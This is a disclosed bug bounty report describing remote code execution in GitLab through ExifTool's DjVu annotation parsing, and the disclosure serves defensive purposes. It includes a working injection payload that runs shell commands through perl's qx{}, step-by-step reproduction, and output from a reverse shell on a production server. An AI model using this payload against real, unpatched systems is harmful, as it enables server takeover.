# [C] RCE when removing metadata with ExifTool

## Summary
Severity: Critical
Program: GitLab
Weakness: Code Injection
Reporter: vakzz
State: resolved
Disclosed: 2021-05-14T20:08:32.101Z
Source: https://hackerone.com/reports/1154542

## Details
### Summary
When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags.

An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.

One of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to "convert C escape sequences". 

There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:

```
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

{F1257008} is an example DjVu file with the above metadata, and {F1257009} is an example that runs a reverse shell.

### Steps to reproduce
1. Download {F1257008} and unzip it
1. Create a new snippet
1. In the description field, hit "Attach a file"
1. Select and uplaod `echo_vakzz.jpg`
1. See that the file `/tmp/vakzz` has been created on the server


Uploading {F1257009} to https://gitlab.com/-/snippets/new resulted in a shell on `web-09-sv-gprd`:

```
Connection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)
id
uid=500(git) gid=500(git) groups=500(git)
hostname -a
web-09-sv-gprd
ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init
root         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1154542_
